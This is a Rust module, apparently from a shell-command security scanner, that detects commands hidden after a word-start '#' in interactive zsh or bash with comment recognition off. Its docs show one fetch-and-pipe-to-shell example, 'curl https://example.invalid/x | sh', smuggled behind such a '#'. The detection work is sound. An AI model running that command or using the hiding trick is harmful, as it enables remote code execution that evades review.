//! A word-start `#` read by an interactive shell that does not recognise
//! comments.
//!
//! An interactive zsh treats a word-start `#` as an ordinary word character
//! unless `interactivecomments` is set, and that option is off by default
//! (`zsh -f -i`). bash does the same after `shopt -u interactive_comments` (on
//! by default). There `echo hi #; curl https://example.invalid/x | sh` prints
//! `hi #` and runs the pipe, while the POSIX analysis drops everything after
//! the `#` as a comment. The bash and zsh hooks report the option state in
//! the environment (`_TIRITH_INTERACTIVE_COMMENTS=0`, which a pinned older
//! binary ignores; `--no-interactive-comments` says the same on the command
//! line), which reaches the engine as `AnalysisContext::interactive_comments
//! == false` ([`applies`]). The engine then also analyzes [`comment_probe`]'s
//! copy of the input, in which each such `#` is escaped into a literal word
//! character, and adds what that analysis finds to the analysis of the input
//! as typed: the raw reading is never replaced. The copy is built from the
//! whole input, `# tirith-card:` prelude included (that shell runs a prelude
//! line), a line-scoped `TIRITH=0` bypass must be eligible in the copy too
//! (`TIRITH=0 ls #; cmd` is two commands there), and runtime threat
//! enrichment reads the copy as well
//! ([`crate::engine::interactive_comments_reading`]).
//!
//! The same copy is made for a nested shell that reads its script that way,
//! whatever the outer shell does: an interactive zsh fed its script on stdin
//! (`zsh -i <<< 'echo hi #; cmd'`), and bash with `-i` and `+O
//! interactive_comments` (stdin or `-c`); see the executable-body recovery in
//! `extract`.
//!
//! Where the interactive shell reads a word-start `#` as a word character,
//! each checked in a pty against zsh 5.9 (`-f -i`) and bash 5.3 (`shopt -u
//! interactive_comments`):
//!
//! - The line itself, `{ ...; }`, `( ... )`, `if`/`for`/`while` bodies,
//!   function bodies and `case` patterns written on it: both shells.
//! - `$(...)` and backtick bodies (also inside double quotes): zsh. bash
//!   parses them with comment recognition, so this reading only adds findings
//!   for bash.
//! - `$(...)` and backtick bodies in an unquoted heredoc body: zsh (`$(echo a
//!   #` on one body line, `echo RAN)` on the next, prints `a #` and `RAN`).
//! - `<(...)`, `>(...)` and zsh `=(...)`: neither shell. Both parse a process
//!   substitution body as a separate string and recognise comments there.
//! - Heredoc bodies themselves are data, and `eval` strings in zsh,
//!   `sh -c`/`zsh -c` strings and other programs' input are read with
//!   comments: none of them is rewritten. bash does read an `eval` string
//!   without comments while `interactive_comments` is off; that reading is
//!   not modelled (see `docs/internals.md`).
//!
//! bash's enter mode delivers the accepted line with `eval` from its prompt
//! hook, where bash recognised comments even with the option off (same pty
//! check), so for that mode the extra findings are only conservative.
//!
//! The probe escapes exactly the `#`s the POSIX tokenizer reads as comment
//! starts ([`crate::tokenize::posix_comment_starts_without_comments`]),
//! outside quotes, `$'...'`, `${...}` and heredoc bodies, and never after a
//! backslash: quoted and mid-word `#` (`a#b`, `${x#y}`, `$#`, `"# x"`) are
//! already literal in every reading. A `!` run right after an escaped `#` is
//! escaped too ([`escape_starts`]), so a script's `#!/bin/bash` line is not
//! read as a command formed by history expansion.
//!
//! The copy goes through the same Tier-1 gate as any input, bound to the
//! outer analysis's policy: a commented line whose copy fast-exits keeps the
//! fast path, and only a copy that finds something sends the input itself to
//! the full analysis.

use std::ops::Range;

use crate::extract::ScanContext;
use crate::tokenize::ShellType;

/// Whether this analysis reads input the way an interactive POSIX shell
/// without comment recognition reads it: an exec check from the bash/zsh
/// hooks or a paste check from their paste widgets (`--interactive`), whose
/// shell reported comments off (`_TIRITH_INTERACTIVE_COMMENTS=0` or
/// `--no-interactive-comments`). Agent integrations pass
/// `--non-interactive` and run commands in shells that recognise comments;
/// fish, PowerShell and cmd hooks never report the option.
pub(crate) fn applies(
    shell: ShellType,
    scan_context: ScanContext,
    interactive: bool,
    interactive_comments: bool,
) -> bool {
    !interactive_comments
        && interactive
        && shell == ShellType::Posix
        && matches!(scan_context, ScanContext::Exec | ScanContext::Paste)
}

/// The largest input the probe is built for: the root ceiling of the shell
/// body scanners. A larger input that holds a `#` is reported as unreliable.
const MAX_PROBE_INPUT_BYTES: usize = crate::extract::MAX_EXECUTABLE_SCAN_INPUT_BYTES;

/// Escaping a `#` can reveal a heredoc operator that the comment hid, which
/// makes the lines after it heredoc data, so a pass stops after the first
/// line where that can happen and the probe is read again. Two passes settle
/// any input without such a line.
const MAX_PROBE_PASSES: usize = 32;

/// [`comment_probe`]'s answer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum CommentProbe {
    /// No `#` the interactive shell reads differently: nothing to add.
    Unchanged,
    /// A copy of the input with each such `#` escaped.
    Rewritten(ProbeText),
    /// The rewriting did not settle (see [`MAX_PROBE_PASSES`]) or the input
    /// is past [`MAX_PROBE_INPUT_BYTES`].
    Unreliable,
}

/// The input with a backslash in front of every word-start `#` that an
/// interactive shell without comment recognition reads as a word character
/// (and in front of each `!` right after such a `#`, see [`escape_starts`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ProbeText {
    pub(crate) text: String,
    /// Byte offsets in `text` of the inserted backslashes, ascending.
    pub(crate) inserted: Vec<usize>,
}

impl ProbeText {
    /// The byte offset in the original input of byte `offset` of the probe
    /// text (an inserted backslash maps to the character it escapes).
    pub(crate) fn source_offset(&self, offset: usize) -> usize {
        offset - self.inserted.partition_point(|inserted| *inserted < offset)
    }

    /// The byte offsets in the original input of the escaped `#`s.
    #[cfg(test)]
    fn escaped_hashes(&self) -> Vec<usize> {
        self.inserted
            .iter()
            .filter(|inserted| self.text.as_bytes().get(**inserted + 1) == Some(&b'#'))
            .map(|inserted| self.source_offset(*inserted))
            .collect()
    }
}

/// Build the probe copy of `raw` (see the module docs).
pub(crate) fn comment_probe(raw: &str) -> CommentProbe {
    if !raw.contains('#') {
        return CommentProbe::Unchanged;
    }
    if raw.len() > MAX_PROBE_INPUT_BYTES {
        return CommentProbe::Unreliable;
    }
    let mut text = raw.to_string();
    for _ in 0..MAX_PROBE_PASSES {
        let starts = live_comment_starts(&text);
        if starts.is_empty() {
            if text == raw {
                return CommentProbe::Unchanged;
            }
            let inserted = inserted_backslashes(raw, &text);
            return CommentProbe::Rewritten(ProbeText { text, inserted });
        }
        let starts = &starts[..settled_prefix(&text, &starts)];
        text = escape_starts(&text, starts);
    }
    CommentProbe::Unreliable
}

/// `text` with a backslash in front of each `#` at `starts`, and in front of
/// each `!` of a run right after one. Such a `!` starts a history reference
/// in zsh, which expands it into a word that begins with `#` (`#!/bin/echo`
/// ran `#/bin/echo seeded-history` and failed, `#!/bin/bash` failed with
/// `event not found`, in a pty), and bash does not expand history after a
/// word-start `#`. Either way the reference re-runs earlier, already checked
/// history text glued to `#`, so the probe leaves it to the history analysis
/// of the input as typed instead of reading a script's `#!/bin/bash` line as
/// a command formed by history expansion.
fn escape_starts(text: &str, starts: &[usize]) -> String {
    let bytes = text.as_bytes();
    let mut escaped = String::with_capacity(text.len() + starts.len() * 2);
    let mut cursor = 0usize;
    for start in starts {
        escaped.push_str(&text[cursor..*start]);
        escaped.push_str("\\#");
        cursor = start + 1;
        while bytes.get(cursor) == Some(&b'!') {
            escaped.push_str("\\!");
            cursor += 1;
        }
    }
    escaped.push_str(&text[cursor..]);
    escaped
}

/// The offsets in `probe` of the backslashes [`escape_starts`] inserted into
/// `raw`. Each sits in front of a `#` or `!` that `raw` has at that point,
/// never in front of one of `raw`'s own backslashes, so a greedy walk pairs
/// every other byte.
fn inserted_backslashes(raw: &str, probe: &str) -> Vec<usize> {
    let (raw, probe) = (raw.as_bytes(), probe.as_bytes());
    let mut inserted = Vec::with_capacity(probe.len().saturating_sub(raw.len()));
    let mut index = 0usize;
    for (offset, byte) in probe.iter().enumerate() {
        if raw.get(index) == Some(byte) {
            index += 1;
        } else {
            inserted.push(offset);
        }
    }
    inserted
}

/// How many of `starts` (ascending) one pass may escape: all of them, unless
/// the text after one of them on its line holds `<<`. Escaping that `#` may
/// reveal a heredoc operator, which turns the following lines into heredoc
/// data, so the pass stops after the starts on that line.
fn settled_prefix(text: &str, starts: &[usize]) -> usize {
    for start in starts {
        let line_end = text[*start..]
            .find('\n')
            .map_or(text.len(), |offset| start + offset);
        if text[*start..line_end].contains("<<") {
            return starts.partition_point(|other| *other < line_end);
        }
    }
    starts.len()
}

/// The byte offsets, ascending, of every `#` in `text` that starts a comment
/// for the POSIX tokenizer where the interactive shell reads it as a word
/// character.
fn live_comment_starts(text: &str) -> Vec<usize> {
    let (view, heredocs) = crate::extract::posix_heredoc_masked_view(text);
    let mut starts: Vec<usize> = crate::tokenize::posix_comment_starts_without_comments(&view)
        .into_iter()
        .filter(|start| !start.in_process_substitution)
        .map(|start| start.offset)
        .collect();
    for heredoc in heredocs.iter().filter(|heredoc| !heredoc.quoted) {
        heredoc_substitution_comment_starts(text, heredoc.body.clone(), &mut starts);
    }
    starts.retain(|start| text.as_bytes().get(*start) == Some(&b'#'));
    starts.sort_unstable();
    starts.dedup();
    starts
}

/// Comment starts inside the `$(...)` and backtick substitutions of an
/// unquoted heredoc body (`body`, a range of `text`), which the interactive
/// zsh expands and reads without comments. Found the way the heredoc
/// recovery finds them; one that does not close inside the body is left to
/// the analysis of the heredoc itself.
fn heredoc_substitution_comment_starts(text: &str, body: Range<usize>, starts: &mut Vec<usize>) {
    let bytes = text.as_bytes();
    let mut index = body.start;
    while index < body.end {
        match bytes[index] {
            b'\\' => {
                index += 2;
                continue;
            }
            b'$' if bytes.get(index + 1) == Some(&b'(') && bytes.get(index + 2) != Some(&b'(') => {
                let Some(close) = crate::extract::posix_delimiter_close(text, index + 1)
                    .filter(|close| *close < body.end)
                else {
                    index += 2;
                    continue;
                };
                extend_with_substitution_starts(text, index..close + 1, starts);
                index = close + 1;
                continue;
            }
            b'`' => {
                let Some(close) = crate::extract::posix_backtick_close(text, index)
                    .filter(|close| *close < body.end)
                else {
                    index += 1;
                    continue;
                };
                extend_with_substitution_starts(text, index..close + 1, starts);
                index = close + 1;
                continue;
            }
            _ => {}
        }
        index += 1;
    }
}

fn extend_with_substitution_starts(
    text: &str,
    substitution: Range<usize>,
    starts: &mut Vec<usize>,
) {
    let Some(source) = text.get(substitution.clone()) else {
        return;
    };
    starts.extend(
        crate::tokenize::posix_comment_starts_without_comments(source)
            .into_iter()
            .filter(|start| !start.in_process_substitution)
            .map(|start| substitution.start + start.offset),
    );
}

/// Put in front of the description of a finding only the probe reading
/// produced.
pub(crate) const PROBE_FINDING_NOTE: &str = "This shell runs the text after a word-start `#` \
     (zsh with `interactivecomments` off, its default, or bash with `interactive_comments` off): ";

/// The finding for [`CommentProbe::Unreliable`].
pub(crate) fn unreliable_finding(raw: &str) -> crate::verdict::Finding {
    crate::verdict::Finding {
        rule_id: crate::verdict::RuleId::AnalysisIncomplete,
        severity: crate::verdict::Severity::High,
        title: "zsh runs the text after '#' here (interactivecomments is off)".to_string(),
        description: "This shell does not treat a word-start `#` as a comment, so the text \
                      after it runs, and Tirith could not settle how the shell reads this input \
                      without comments. Set `setopt interactivecomments` (zsh) or `shopt -s \
                      interactive_comments` (bash), or quote or escape the `#`."
            .to_string(),
        evidence: vec![crate::verdict::Evidence::CommandPattern {
            pattern: "word-start # without interactive comments".to_string(),
            matched: crate::redact::redact_shell_assignments(
                &raw.chars().take(256).collect::<String>(),
            ),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn probe(raw: &str) -> Option<String> {
        match comment_probe(raw) {
            CommentProbe::Unchanged => None,
            CommentProbe::Rewritten(probe) => Some(probe.text),
            CommentProbe::Unreliable => panic!("unreliable probe for {raw:?}"),
        }
    }

    #[test]
    fn live_word_start_hashes_are_escaped() {
        for (raw, expected) in [
            ("echo hi #; echo RAN", "echo hi \\#; echo RAN"),
            ("git status # check", "git status \\# check"),
            ("gh issue view #12", "gh issue view \\#12"),
            ("ls # list", "ls \\# list"),
            ("# a comment line", "\\# a comment line"),
            ("echo hi;#x", "echo hi;\\#x"),
            ("echo hi|#x", "echo hi|\\#x"),
            ("echo a #b #c", "echo a \\#b \\#c"),
            ("a\n# b\nc", "a\n\\# b\nc"),
            // Text a comment hid is live, including its own `#`s.
            ("echo #'x' #y", "echo \\#'x' \\#y"),
            // Bodies the interactive line lexes.
            ("echo $(echo a #; echo b)", "echo $(echo a \\#; echo b)"),
            (
                "echo \"$(echo a #; echo b)\"",
                "echo \"$(echo a \\#; echo b)\"",
            ),
            ("echo `echo a #; echo b`", "echo `echo a \\#; echo b`"),
            ("{ echo a #; echo b; }", "{ echo a \\#; echo b; }"),
            ("( echo a #; echo b )", "( echo a \\#; echo b )"),
            ("f() { echo a #; echo b; }", "f() { echo a \\#; echo b; }"),
            (
                "if true; then echo a #; echo b; fi",
                "if true; then echo a \\#; echo b; fi",
            ),
            ("case x in #*) :;; esac", "case x in \\#*) :;; esac"),
            // A history reference glued to the `#` stays with the history
            // analysis of the input as typed.
            (
                "#!/bin/bash\necho hi # say hi",
                "\\#\\!/bin/bash\necho hi \\# say hi",
            ),
            ("echo x #!! y", "echo x \\#\\!\\! y"),
        ] {
            assert_eq!(probe(raw).as_deref(), Some(expected), "{raw:?}");
        }
    }

    #[test]
    fn literal_hashes_are_left_alone() {
        for raw in [
            "echo 'a #b'",
            "echo \"a #b\"",
            "echo $'a #b'",
            "echo $'it\\'s #b'",
            "echo a\\#b \\#c",
            "x=abc; echo ${x#a} ${x##*b} ${#x} $# a#b",
            "echo ${x:- #}",
            "echo $(( 16#ff ))",
            "curl https://example.com/#frag",
            "echo {a,b}#c",
            "printf '%s\\n' \"#\"",
        ] {
            assert_eq!(probe(raw), None, "{raw:?}");
        }
    }

    #[test]
    fn process_substitution_bodies_keep_their_comments() {
        // bash and zsh parse these bodies as separate strings and recognise
        // comments there.
        for raw in [
            "cat <(echo a #; echo b)",
            "echo hi > >(cat #; echo b)",
            "cat =(echo a #; echo b)",
            "diff <(ls #x) <(ls)",
            "echo $( cat <(echo a #x) )",
        ] {
            assert_eq!(probe(raw), None, "{raw:?}");
        }
        // An array assignment is not a process substitution.
        assert_eq!(
            probe("a=(x #y\nz)").as_deref(),
            Some("a=(x \\#y\nz)"),
            "array assignment"
        );
        assert_eq!(
            probe("cat <(ls) #; echo b").as_deref(),
            Some("cat <(ls) \\#; echo b"),
        );
    }

    #[test]
    fn heredoc_bodies_are_data_but_their_substitutions_are_lexed() {
        assert_eq!(probe("cat <<EOF\n# not code\nEOF"), None);
        assert_eq!(probe("cat <<'EOF'\n$(echo a #\necho b)\nEOF"), None);
        assert_eq!(
            probe("cat <<EOF\n$(echo a #\necho b)\nEOF\necho c # d").as_deref(),
            Some("cat <<EOF\n$(echo a \\#\necho b)\nEOF\necho c \\# d"),
        );
        assert_eq!(
            probe("cat <<EOF\n`echo a #\necho b`\nEOF").as_deref(),
            Some("cat <<EOF\n`echo a \\#\necho b`\nEOF"),
        );
        // A heredoc operator a comment hid becomes live: its body is data.
        assert_eq!(
            probe("cat # <<EOF\n# body\nEOF").as_deref(),
            Some("cat \\# <<EOF\n# body\nEOF"),
        );
        // The text after the terminator is read again.
        assert_eq!(
            probe("cat <<EOF\n#x\nEOF\nls # y").as_deref(),
            Some("cat <<EOF\n#x\nEOF\nls \\# y"),
        );
    }

    #[test]
    fn probe_offsets_map_back_to_the_input() {
        let CommentProbe::Rewritten(probe) = comment_probe("a #b #c\nd # e") else {
            panic!("expected a probe");
        };
        assert_eq!(probe.text, "a \\#b \\#c\nd \\# e");
        assert_eq!(probe.escaped_hashes(), vec![2, 5, 10]);
        assert_eq!(probe.source_offset(0), 0);
        assert_eq!(
            probe.source_offset(probe.text.len()),
            "a #b #c\nd # e".len()
        );

        let raw = "a\\#b #!x\\\\ #c";
        let CommentProbe::Rewritten(probe) = comment_probe(raw) else {
            panic!("expected a probe");
        };
        assert_eq!(probe.text, "a\\#b \\#\\!x\\\\ \\#c");
        assert_eq!(probe.inserted, vec![5, 7, 13]);
        assert_eq!(probe.escaped_hashes(), vec![5, 11]);
        assert_eq!(probe.source_offset(probe.text.len()), raw.len());
    }

    #[test]
    fn each_revealed_heredoc_is_read_again_and_an_unsettled_probe_is_unreliable() {
        // Escaping each `#` reveals a heredoc operator; its body (empty here)
        // ends at the next line, after which the next `#` is live again.
        let pairs = ": # <<E\nE\n";
        assert_eq!(
            probe(&pairs.repeat(3)).as_deref(),
            Some(": \\# <<E\nE\n".repeat(3).as_str())
        );
        assert_eq!(
            comment_probe(&pairs.repeat(MAX_PROBE_PASSES + 4)),
            CommentProbe::Unreliable
        );
    }

    #[test]
    fn applies_only_to_interactive_posix_exec_and_paste_without_comments() {
        assert!(applies(ShellType::Posix, ScanContext::Exec, true, false));
        assert!(applies(ShellType::Posix, ScanContext::Paste, true, false));
        assert!(!applies(ShellType::Posix, ScanContext::Exec, true, true));
        assert!(!applies(ShellType::Posix, ScanContext::Exec, false, false));
        assert!(!applies(
            ShellType::Posix,
            ScanContext::FileScan,
            true,
            false
        ));
        assert!(!applies(ShellType::Fish, ScanContext::Exec, true, false));
        assert!(!applies(
            ShellType::PowerShell,
            ScanContext::Exec,
            true,
            false
        ));
    }
}
